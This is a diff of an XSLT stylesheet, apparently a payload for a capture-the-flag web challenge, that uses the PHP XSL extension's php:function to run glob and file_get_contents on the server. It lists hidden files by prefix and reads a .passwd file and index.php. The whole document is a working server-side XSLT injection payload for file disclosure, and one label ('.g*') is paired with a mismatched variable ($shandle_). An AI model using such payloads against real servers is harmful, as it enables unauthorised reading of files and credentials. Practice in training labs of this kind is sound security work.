@@ -2,8 +2,6 @@
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
 xmlns:php="http://php.net/xsl"              
 >	
-
-
 <xsl:param  name="shandlea"    select="php:function('glob','/challenge/web-serveur/ch50/.a*')" disable-output-escaping="yes"/>
 <xsl:param  name="shandleb"    select="php:function('glob','/challenge/web-serveur/ch50/.b*')" disable-output-escaping="yes"/>
 <xsl:param  name="shandlec"    select="php:function('glob','/challenge/web-serveur/ch50/.c*')" disable-output-escaping="yes"/>
@@ -35,13 +33,13 @@ xmlns:php="http://php.net/xsl"
 <xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/.passwd')" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <xsl:template match="/">	
-  SCANDIR0 .a*:<xsl:value-of select="$shandlea"/> 
-  SCANDIR0 .b*:<xsl:value-of select="$shandleb"/> 
-  SCANDIR0 .c*:<xsl:value-of select="$shandlec"/> 
-  SCANDIR0 .d*:<xsl:value-of select="$shandled"/> 
-  SCANDIR0 .e*:<xsl:value-of select="$shandlee"/>  
-  SCANDIR0 .f*:<xsl:value-of select="$shandlef"/> 
-  SCANDIR0 .g*:<xsl:value-of select="$shandleg"/> 
+  SCANDIR0 .u*:<xsl:value-of select="$shandleu"/> 
+  SCANDIR0 .v*:<xsl:value-of select="$shandlev"/> 
+  SCANDIR0 .w*:<xsl:value-of select="$shandlew"/> 
+  SCANDIR0 .x*:<xsl:value-of select="$shandlex"/> 
+  SCANDIR0 .y*:<xsl:value-of select="$shandley"/>  
+  SCANDIR0 .z*:<xsl:value-of select="$shandlez"/> 
+  SCANDIR0 .g*:<xsl:value-of select="$shandle_"/> 
   SCANDIR0 .h*:<xsl:value-of select="$shandleh"/> 
   SCANDIR0 .i*:<xsl:value-of select="$shandlei"/> 
   SCANDIR0 .j*:<xsl:value-of select="$shandlej"/>   
